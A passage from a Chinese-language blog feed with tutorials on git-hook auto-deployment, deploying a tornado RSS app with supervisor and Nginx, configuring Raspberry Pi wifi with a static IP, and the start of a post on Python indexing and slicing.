~/remoteRepo/webapp.git/hooks</span><br><span class="line">$ vim post-receive</span><br><span class="line">$ <span class="built_in">cat</span> post-receive</span><br></pre></td></tr></table></figure><p><code>post-receive</code>中的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Check the remote git repository whether it is bare</span><br><span class="line">IS_BARE=$(git rev-parse --is-bare-repository)</span><br><span class="line">if [ -z &quot;$IS_BARE&quot; ]; then</span><br><span class="line">    echo &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset GIT_DIR</span><br><span class="line"># current user is git</span><br><span class="line">DeployPath=/home/git/deployment/webapp</span><br><span class="line">if [ ! -d $DeployPath ] ; then</span><br><span class="line">    echo &gt;&amp;2 &quot;fatal: post-receive: DEPLOY_DIR_NOT_EXIST: \&quot;$DeployPath\&quot;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd $DeployPath</span><br><span class="line">git add . -A &amp;&amp; git stash</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p>为<code>post-receive</code>添加可执行权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br></pre></td></tr></table></figure><h4><span id="wei-local-machined-de-ben-di-cang-ku-tian-jia-yuan-cheng-cang-ku-yuan">为local machined的本地仓库添加远程仓库源：</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;your-local-repository-folder&gt;</span><br><span class="line">$ git remote add deploy git@&lt;server.ip&gt;:/home/git/remoteRepo/webapp.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># then you need to merge conflict between local changes and deploy/master before you push it.</span></span><br><span class="line"><span class="comment"># &#x27;git merge remotes/deploy/master&#x27; or some other git commands.</span></span><br><span class="line"></span><br><span class="line">$ git push deploy master</span><br></pre></td></tr></table></figure><p>或者从头开始创建一个项目：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>这样，当我们在本地完成更新并push到server上时，这些代码就会被自动更新。</p><h2><span id="0x02-hou-lai">0x02 后来</span></h2><h4><span id="gai-jin-1">改进1</span></h4><p>可以在最初在server上创建裸仓库时使用local machine上的现有项目，即将local machine上的项目仓库导出为裸仓库 — 即一个不包含当前工作目录的仓库：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --bare my_project my_project.git</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> -Rf my_project/.git my_project.git</span><br></pre></td></tr></table></figure><p>然后将这个裸仓库移到server上</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scp -r my_project.git git@&lt;server.ip&gt;:/home/git/remoteRepo</span><br></pre></td></tr></table></figure><p>之后，其他人要进行更新时就可以clone这个项目了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@&lt;server.ip&gt;:/home/git/remoteRepo/my_project.git</span><br></pre></td></tr></table></figure><h4><span id="gai-jin-2">改进2</span></h4><p>有一种情况是当本地更新了webapp，结果push到远程仓库后这个更新被reset了（虽然我觉得这个问题应该避免，但是还是有可能发生），这是，简单地在hook中使用<code>git push deploy master</code>是无法完成这个过程的，因为远端的代码版本低于deploy端的代码版本，再使用pull的时候就不能实现同步，这时就应该使用另一种方式更新代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin/master</span><br></pre></td></tr></table></figure><p>即<code>git reset</code>把HEAD 指向了新下载的未合并的节点，也就是在local machine上reset之后的。</p><p>参考：<a href="http://blog.csdn.net/a06062125/article/details/11727273">git 放弃本地修改 强制更新</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用 Git Hooks 实现项目自动部署
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>使用Nginx，supervisor在DigitalOcean中部署tornado项目</title>
    <link href="https://qiwihui.com/qiwihui-blog-17/"/>
    <id>https://qiwihui.com/qiwihui-blog-17/</id>
    <published>2018-10-09T05:32:13.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>一直在想把微信的公众号的文章导出为RSS阅读，方便阅读和减少对微信的依赖，后来看到<a href="https://github.com/zhu327/rss">zhu327/rss</a> 这个项目，这是一个用来生成微博，微信公众号，知乎日报 RSS 的Web APP。但是这个项目的demo部署在Red Hat的openshift上，囿于对这个cloud的操作不是很熟，所以想着把这个项目重新部署到自己在DigitalOcean的机器上，就fork了这个项目开始啦！</p><span id="more"></span><p>以下涉及到的内容有：</p><ul><li>Linux创建用户和修改用户组</li><li>git hooks实现自动部署</li><li>tornado项目的基本框架结构</li><li>supervisor管理进程</li><li>Nginx配置HTTP服务代理</li><li>DNS的记录添加</li></ul><h2><span id="ji-ben-fu-wu-qi-she-zhi">基本服务器设置</span></h2><p>因为之前并没有在我的服务器上创建过其他用户，如果直接用root用户的话不好，所以需要专门的一个账户来负责部署。</p><ol start="0"><li><p>登陆服务器：<code>ssh root@&lt;server-ip&gt;</code></p></li><li><p>创建一个用户<code>deploy</code>: <code>sudo adduser deploy</code></p></li><li><p>将用户加入sudoers中: <code>sudo usermod -a -G sudo deploy</code></p></li><li><p>添加远程连接的权限，这样就省去了输入密码了：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - deploy</span><br><span class="line">mkdir .ssh</span><br><span class="line">chmod 700 .ssh</span><br><span class="line">touch .ssh/authorized_keys</span><br><span class="line">chmod 600 .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>其中，<code>700</code>表示只有文件拥有者才能读，写以及打开文件，<code>600</code>表示只能读和写。</p></li><li><p>接着将自己的公钥加入<code>authorized_keys</code>文件中，这个公钥在自己本机<code>~.ssh/id_rsa.pub</code>中。没有的话可以用<code>ssh-keygen -t rsa -C &quot;qwh005007@gmail.com&quot;</code>来生成。</p></li></ol><h2><span id="chuang-jian-shi-yong-git-hooks-de-zi-dong-bu-shu">创建使用git hooks的自动部署</span></h2><p>自动部署的好处就是省去了每次都要上服务器。可以参见之前的一篇博客<a href="http://daozhang.info/deploy-projects-with-git-hooks/">使用 Git Hooks 实现项目自动部署</a> 来创建这个远程的git server。</p><p>这里，我们要先fork <a href="https://github.com/zhu327/rss">zhu327/rss</a> 这个项目，然后用<code>git clone --bare rss rss.git</code>生成原来项目的裸仓库，然后将其复制到服务器上。我使用的是<code>~/remoteRepo/rss.git</code>做为git server，<code>~/deployment/rss</code>做为真正生产的代码文件目录。</p><p>其中，git hooks中的<code>post-receive</code>文件的内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Check the remote git repository whether it is bare</span><br><span class="line">IS_BARE=$(git rev-parse --is-bare-repository)</span><br><span class="line">if [ -z &quot;$IS_BARE&quot; ]; then</span><br><span class="line">echo &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset GIT_DIR</span><br><span class="line"># current user is git</span><br><span class="line">DeployPath=/home/deploy/deployment/rss</span><br><span class="line">if [ ! -d $DeployPath ] ; then</span><br><span class="line">echo &gt;&amp;2 &quot;fatal: post-receive: DEPLOY_DIR_NOT_EXIST: \&quot;$DeployPath\&quot;&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd $DeployPath</span><br><span class="line">git add . -A &amp;&amp; git stash</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><h2><span id="xiu-gai-yuan-dai-ma">修改源代码</span></h2><p><a href="https://github.com/zhu327/rss">zhu327/rss</a> 项目的部署在openshift，为了将其部署在自己服务器上，修改是必须的。</p><ul><li><p>删除了项目中的openshift hooks部分</p></li><li><p>将其中用到openshift环境变量<code>OPENSHIFT_DIY_IP</code>和<code>OPENSHIFT_DIY_PORT</code>修改为对应的<code>localhost</code>和<code>8000</code>端口</p></li><li><p>将<code>diy/templates/</code>中的<code>https://diy-devz.rhcloud.com</code>修改为之后要用到的地址 <code>http://rss.daozhang.info</code></p></li><li><p>然后将修改好的代码在本地的virtualenv环境中测试，并生成需要的python的模块文件<code>requirement.txt</code>。如下：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jinja2==2.7.3</span><br><span class="line">MarkupSafe==0.23</span><br><span class="line">backports.ssl-match-hostname==3.4.0.2</span><br><span class="line">certifi==2015.04.28</span><br><span class="line">lxml==3.4.4</span><br><span class="line">python-dateutil==2.4.2</span><br><span class="line">python-memcached==1.54</span><br><span class="line">six==1.9.0</span><br><span class="line">tornado==4.2</span><br><span class="line">wsgiref==0.1.2</span><br></pre></td></tr></table></figure></li></ul><p>这些都好了之后就可以将本地的文件第一次push到服务器上了。因为之前已经设置好了git hook，所以可以在服务器上的<code>deployment/rss</code>看到项目的代码更新了。</p><h2><span id="shi-yong-supervisor-guan-li-jin-cheng">使用supervisor管理进程</span></h2><p><code>supervisor</code>是Linux中非常好用的进程管理工具，我们将使用它和Nginx一起来组成我们的服务的部署。</p><ol><li><p>安装supervisor：<code>pip install supervisor</code> 或者 <code>sudo apt-get install supervisor</code></p></li><li><p>创建一个目录来装supervisor的配置文件：<code>mkdir -p ~/local/etc/supervisord</code></p></li><li><p>创建superviosr的出要的配置文件：<code>touch ~/local/etc/supervisord.conf</code>，并加入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/home/deploy/tmp/supervisor.sock</span><br><span class="line"> </span><br><span class="line">[supervisord]</span><br><span class="line">user=deploy</span><br><span class="line">logfile=/home/deploy/logs/user/supervisord.log</span><br><span class="line">logfile_maxbytes=50MB</span><br><span class="line">logfile_backups=10 </span><br><span class="line">loglevel=info</span><br><span class="line">pidfile=/home/deploy/local/run/supervisord.pid supervisord.pid)</span><br><span class="line"> </span><br><span class="line">[rpcinterface:supervisor]</span><br><span class="line">supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"> </span><br><span class="line">[supervisorctl]</span><br><span class="line">serverurl=unix:///home/deploy/tmp/supervisor.sock</span><br><span class="line"> </span><br><span class="line">[include]</span><br><span class="line">files = /home/deploy/local/etc/supervisord/*.ini</span><br></pre></td></tr></table></figure><p>其中我们都适用用户目录下创建的<code>local</code>，<code>logs</code>和<code>tmp</code>文件夹来装这些文件。</p></li><li><p>创建一个rss.ini的文件用来作为rss服务：<code>touch ~/local/etc/supervisord/rss.ini</code>，放入如下内容：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[program:rss]</span><br><span class="line">command=python2.7 /home/deploy/deployment/rss/diy/start.py</span><br></pre></td></tr></table></figure><p>其中，<code>start.py</code>是这个tornado项目的入口。</p></li><li><p>启动服务：<code>supervisord -c /home/deploy/local/etc/supervisord.conf</code>，因为用的是非默认的配置文件，这里指定相应的配置文件位置。</p></li><li><p>一旦我们在之后修改了项目push了之后，我们需要重新启动rss：<code>supervisorctl restart rss</code>，因此，为了方便，可以将这条命令加入项目git hooks中的<code>post-receive</code>文件末尾。</p></li></ol><h2><span id="pei-zhi-nginx">配置Nginx</span></h2><p>Nginx很好很强大，我们用它来做为我们的HTTP服务器。</p><ol><li><p>安装Nginx，这里，我们适用从源代码安装Nginx，并配置一些log，pid等的目录到deploy的用户目录下，这里，写一个安装的脚本<code>install.sh</code>：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/src</span><br><span class="line">mkdir -p ~/tmp/nginx/fcgi ~/tmp/nginx/proxy ~/tmp/nginx/client</span><br><span class="line"></span><br><span class="line">cd ~/src</span><br><span class="line">curl -O  http://nginx.org/download/nginx-1.2.1.tar.gz</span><br><span class="line">tar -xzvf nginx-1.2.1.tar.gz</span><br><span class="line">cd nginx-1.2.1</span><br><span class="line"></span><br><span class="line">./configure   --prefix=$HOME/local/nginx  \</span><br><span class="line">--sbin-path=$HOME/local/sbin/nginx \</span><br><span class="line">--conf-path=$HOME/local/etc/nginx.conf  \</span><br><span class="line">--error-log-path=$HOME/logs/user/nginx/error.log \</span><br><span class="line">--http-log-path=$HOME/logs/user/nginx/access.log \</span><br><span class="line">--pid-path=$HOME/local/run/nginx/nginx.pid \</span><br><span class="line">--lock-path=$HOME/local/lock/nginx.lock \</span><br><span class="line">--http-client-body-temp-path=$HOME/tmp/nginx/client/ \</span><br><span class="line">--http-proxy-temp-path=$HOME/tmp/nginx/proxy/  \</span><br><span class="line">--http-fastcgi-temp-path=$HOME/tmp/nginx/fcgi/ \</span><br><span class="line">--with-http_flv_module \</span><br><span class="line">--with-http_ssl_module \</span><br><span class="line">--with-http_gzip_static_module</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>在Nginx的安装过程中会列出这些配置信息：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Configuration summary</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + using system OpenSSL library</span><br><span class="line">  + md5: using OpenSSL library</span><br><span class="line">  + sha1: using OpenSSL library</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: &quot;/home/deploy/local/nginx&quot;</span><br><span class="line">  nginx binary file: &quot;/home/deploy/local/sbin/nginx&quot;</span><br><span class="line">  nginx configuration prefix: &quot;/home/deploy/local/etc&quot;</span><br><span class="line">  nginx configuration file: &quot;/home/deploy/local/etc/nginx.conf&quot;</span><br><span class="line">  nginx pid file: &quot;/home/deploy/local/run/nginx/nginx.pid&quot;</span><br><span class="line">  nginx error log file: &quot;/home/deploy/logs/user/nginx/error.log&quot;</span><br><span class="line">  nginx http access log file: &quot;/home/deploy/logs/user/nginx/access.log&quot;</span><br><span class="line">  nginx http client request body temporary files: &quot;/home/deploy/tmp/nginx/client/&quot;</span><br><span class="line">  nginx http proxy temporary files: &quot;/home/deploy/tmp/nginx/proxy/&quot;</span><br><span class="line">  nginx http fastcgi temporary files: &quot;/home/deploy/tmp/nginx/fcgi/&quot;</span><br><span class="line">  nginx http uwsgi temporary files: &quot;uwsgi_temp&quot;</span><br><span class="line">  nginx http scgi temporary files: &quot;scgi_temp&quot;</span><br></pre></td></tr></table></figure></li><li><p>添加路径到PATH中：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/you/local/sbin:$PATH</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>创建配置文件：<code>~/local/etc/nginx.conf</code>，在其中添加我们服务的配置：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#user  deploy;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log /home/deploy/logs/user/nginx/error.log;</span><br><span class="line">pid /home/deploy/local/run/nginx/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    upstream rsstornado &#123;</span><br><span class="line">        server 127.0.0.1:8000;</span><br><span class="line">    &#125;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    access_log /home/deploy/logs/user/nginx/access.log;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    proxy_read_timeout 200;</span><br><span class="line">    sendfile on;</span><br><span class="line">    tcp_nopush on;</span><br><span class="line">    tcp_nodelay on;</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 1000;</span><br><span class="line">    gzip_proxied any;</span><br><span class="line">    # Relevant docs: http://wiki.nginx.org/HttpGzipModule#gzip_types</span><br><span class="line">    # Enables compression for additional MIME-types besides &quot;text/html&quot;.</span><br><span class="line">    # &quot;text/html&quot; is always compressed.</span><br><span class="line">    gzip_types text/plain text/css text/xml</span><br><span class="line">               application/x-javascript application/xml</span><br><span class="line">               application/atom+xml text/javascript;</span><br><span class="line"></span><br><span class="line">    # Only retry if there was a communication error, not a timeout</span><br><span class="line">    # on the Tornado server (to avoid propagating &quot;queries of death&quot;</span><br><span class="line">    # to all frontends)</span><br><span class="line">    proxy_next_upstream error;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        # server_name  localhost;</span><br><span class="line">        # Allow file uploads</span><br><span class="line">        client_max_body_size 50M;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass_header Server;</span><br><span class="line">            proxy_set_header Host $http_host;</span><br><span class="line">            proxy_redirect off;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Scheme $scheme;</span><br><span class="line">            proxy_pass http://rsstornado;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>upstream rsstornado</code>指向了我们的rss的端口。</p></li><li><p>之后使用<code>/home/deploy/local/sbin/nginx -t</code>来检查这些配置，期望的输出为：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx: the configuration file /home/deploy/local/etc/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /home/deploy/local/etc/nginx.conf test is successful</span><br></pre></td></tr></table></figure></li><li><p>运行服务：<code>/home/deploy/local/sbin/nginx</code></p></li></ol><p>如果一切顺利，这时，我们在浏览器中输入服务器对应的ip时就可以看到这个web app了。</p><h2><span id="tian-jia-a-ji-lu">添加<code>A</code>纪录</span></h2><p>最后的话需要在自己的dns服务商中添加一条指向服务器ip的<code>A</code>距离，例如在 <a href="http://dns.he.net">he.net</a> 中添加一条<code>A</code>记录即可。很快，就可以直接使用 <a href="http://rss.daozhang.info">http://rss.daozhang.info</a> 访问这个app了。</p><h2><span id="zui-hou">最后</span></h2><p>这样，我们就完成了这个server的配置。在我部署这个server的过程中，微信对应的RSS生成的解析实效了，我觉得是因为sogou在其url中添加了一个序列，这个序列是有AES算法得出来的，并且一段时间会换一个key来生成这个序列，所以我暂时也不知道怎么处理这个，有待进一步研究。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用Nginx，supervisor在DigitalOcean中部署tornado项目
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>树莓派启动时自动连接wifi</title>
    <link href="https://qiwihui.com/qiwihui-blog-16/"/>
    <id>https://qiwihui.com/qiwihui-blog-16/</id>
    <published>2018-10-09T05:31:11.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章的目的是为了配置树莓派，使其在启动时自动获取静态IP.</p><span id="more"></span><h2><span id="qi-dong-bing-lian-jie-shu-mei-pai">启动并连接树莓派</span></h2><h4><span id="1-qi-dong-shu-mei-pai-bing-zhao-dao-qi-ip-di-zhi">1. 启动树莓派并找到其IP地址</span></h4><p>把树莓派用网线连接到路由器上，插上SD卡，打开树莓派电源，等大约90秒.<br>在Mac上打开命令行终端，输入<code>arp -a</code>命令，可以看到树莓派的ip地址为 <code>192.168.199.199</code>.当然也可以从路由器后台看到这个IP地址.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ arp -a</span><br><span class="line">? (169.254.99.51) at (incomplete) on en0 [ethernet]</span><br><span class="line">hiwifi.lan (192.168.199.1) at d4:ee:7:20:18:6e on en0 ifscope [ethernet]</span><br><span class="line">raspberrypi.lan (192.168.199.199) at f0:f6:1c:af:7a:28 on en0 ifscope [ethernet]</span><br></pre></td></tr></table></figure><h4><span id="2-shi-yong-ssh-lian-jie-shu-mei-pai">2. 使用SSH连接树莓派</span></h4><p>输入&quot;ssh <a href="mailto:pi@192.168.199.199">pi@192.168.199.199</a>&quot;, 根据要求输入密码，默认为<code>raspberry</code>.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh pi@192.168.199.199</span><br><span class="line">pi@192.168.199.199s password: </span><br><span class="line">Linux qiwihuisrpi 3.18.7+ <span class="comment">#755 PREEMPT Thu Feb 12 17:14:31 GMT 2015 armv6l</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Apr 17 14:45:28 2015 from 192.168.199.186</span><br></pre></td></tr></table></figure><h2><span id="pei-zhi-wang-luo-lian-jie">配置网络连接</span></h2><h4><span id="1-she-zhi-wang-luo-jie-kou-wen-jian-etc-network-interfaces">1. 设置网络接口文件<code>/etc/network/interfaces</code></span></h4><p>编辑这个文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>添加如下内容：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">allow-hotplug eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet manual</span><br><span class="line"><span class="comment"># iface wlan0 inet dhcp # 如果想自动获取ip</span></span><br><span class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态ip</span></span><br><span class="line">iface wlan0 inet static</span><br><span class="line">address 192.168.199.199</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.199.1</span><br><span class="line"></span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure><h4><span id="2-she-zhi-wpa-supplicant-conf-pei-zhi-wen-jian">2. 设置<code>wpa_supplicant.conf</code>配置文件</span></h4><p>编辑文件<code>wpa_supplicant.conf</code>设置连接的网络热点.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nano /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure><p>为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=<span class="string">&quot;YOUR_NETWORK_NAME&quot;</span></span><br><span class="line">    psk=<span class="string">&quot;YOU_NETWORK_PASSWORD&quot;</span></span><br><span class="line">    proto=RSN</span><br><span class="line">    key_mgmt=WPA-PSK</span><br><span class="line">    pairwise=CCMP</span><br><span class="line">    auth_alg=OPEN</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><code>proto</code> 可以是 <code>RSN</code> (WPA2) 或者 <code>WPA</code> (WPA1).</li><li><code>key_mgmt</code> 可以是 <code>WPA-PSK</code> (大部分) 或者 <code>WPA-EAP</code> (企业网络)</li><li><code>pairwise</code> 可以是 <code>CCMP</code> (WPA2) 或者 <code>TKIP</code> (WPA1)</li><li><code>auth_alg</code> 常为 <code>OPEN</code>, 其他可选为 <code>LEAP</code> 和 <code>SHARED</code></li></ul><p>重启树莓派，之后就会自动连上wifi了.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      树莓派启动时自动连接wifi
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>理解python索引和切片</title>
    <link href="https://qiwihui.com/qiwihui-blog-15/"/>
    <id>https://qiwihui.com/qiwihui-blog-15/</id>
    <published>2018-10-09T05:30:14.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>许多初次接触Python的人对于索引都会有同样的反应：这太奇怪了。在Python的列表，字符串和条件语句中都充斥着索引，但在我们习惯他们之前，这些都会是我们程序的错误来源。因此，让我们硬着头皮上吧！</p><span id="more"></span><p>这片文章会写得很慢，为了解释一些基础和默认的东西。</p><p>我们会使用字符串切片举例，因为这事我们首先接触的，不过这对于列表切片和设定范围是一样的。我们有：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br></pre></td></tr></table></figure><p>其中第k个位置的字符为k。</p><p>我们使用如下方式对a进行切片：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = a[start:stop:step]</span><br></pre></td></tr></table></figure><p>或者直接地：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[start:stop:step]</span><br></pre></td></tr></table></figure><p>在Python中，字符串和指向字符串的变量都是对象，所以都可以进行切片（事实上，Python中所有东西都是对象：数字，变量，字符串，函数，文件）。</p><p>有三件事情需要记住：</p><ol><li><code>start</code> 是我们想要的第一项（当然）</li><li><code>stop</code> 是我们第一个不想要的项</li><li><code>step</code> 可以是正整数，也可以是负数，定义了向前（从第一个位置到向末尾）还是向后（从最后一个位置向开始位置）索引。</li></ol><p>一个小提醒：但我们学习python之外其他语言的时候，stop的定义是Python索引和切片在熟悉其语言的程序员看来如此奇怪的原因之一。在大部分计算机语言中，stop应该是“我们需要的最后一项”。不管这个定义是否比其他语言更好或者更坏，Python的确是不寻常的一种语言。</p><p>在索引中使用负数是python另一个奇怪的特性。在大部分C衍生的语言（C/C++/C#，Java,，Javascript等）中，负数索引是不合法的，因为索引表示从字符串初始内存地址的偏移，所以负数索引会指向字符串开始位置之前的位置（更详细的请参见这篇博客：<a href="http://blog.daozhang.info/Why-does-indexing-begin-at-0/">为什么python中索引从0开始</a>）。然而，Python并不是唯一使用负数索引的语言，比如，<a href="http://www.tutorialspoint.com/perl/perl_arrays.htm">Perl</a>像python一样使用负数索引来表示从字符串末尾开始的位置；<a href="http://www.r-tutor.com/r-introduction/vector/vector-index">R</a>语言面向统计，A[-i]表示所有除第i位置的值。不过，只有很少的语言在任意情况下使用负数索引。</p><p>现在让我们回到Python索引上。</p><p>** 使用正数和负数索引 **</p><p>我们可以使用正整数表示字符串中的位置，由字符串开头从0开始计数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quot;my mistress&#x27; eyes are nothing like the sun&quot;</span></span><br><span class="line">     ^         ^                              ^</span><br><span class="line">    b[<span class="number">0</span>]      b[<span class="number">10</span>]                          b[<span class="number">41</span>]</span><br></pre></td></tr></table></figure><p>我们用len()函数来获取一个字符串的长度。因此，b有42个字符，故len(b)=42。因为b最后一个字符是<code>b[41]</code>，所以<code>len(b)</code>比b字符串最后位置索引多1。</p><p>有些时候这对从字符串末尾开始找字符是很有帮助的。所以我们用负数，从字符串末尾开始计数，即从-1（不是0）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quot;my mistress&#x27; eyes are nothing like the sun&quot;</span></span><br><span class="line">     ^         ^                              ^</span><br><span class="line">   b[-<span class="number">42</span>]   b[-<span class="number">32</span>]                          b[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>从末尾看的最后一个字符串是b[-42]，那么它前面的位置会是-len(b)-1 = -43。</p><p>所以，在这个例子中<code>len(b) = 42</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b[<span class="number">0</span>]        = b[-<span class="built_in">len</span>(b)] = b[-<span class="number">42</span>] = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">b[<span class="built_in">len</span>(b)-<span class="number">1</span>] = b[-<span class="number">1</span>]      = b[<span class="number">41</span>]  = <span class="string">&#x27;n&#x27;</span></span><br><span class="line">b[<span class="number">10</span>]       = b[-<span class="number">32</span>]              = <span class="string">&#x27;s&#x27;</span></span><br></pre></td></tr></table></figure><p>并且一般地，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b[k]        = b[-<span class="built_in">len</span>(b)+k]</span><br></pre></td></tr></table></figure><p>hmm, 这很令人疑惑。我们需要了解索引的一般机制，但是，我们不需要记住这些边界值，这些是python中默认的。</p><p>默认值是引用一个变量的时候，我们没有指定明确的值。这就和我们“默认地”称呼一位女性为女士(<a href="http://en.wikipedia.org/wiki/Ms.">Ms.</a>)一样。如果我们没有被告知需要称呼她为太太（Mrs.）或者小姐(Miss），或者如果我们忽略了实际的尊称，我们降退回到“默认”值。Python对于很常用的<code>start</code>, <code>stop</code> and <code>step</code>都有默认值。</p><p>** 如果<code>step</code>是正数，我们向前移动（如果<code>step</code>值为空，则默认为+1）**</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">2</span>:<span class="number">6</span>] = <span 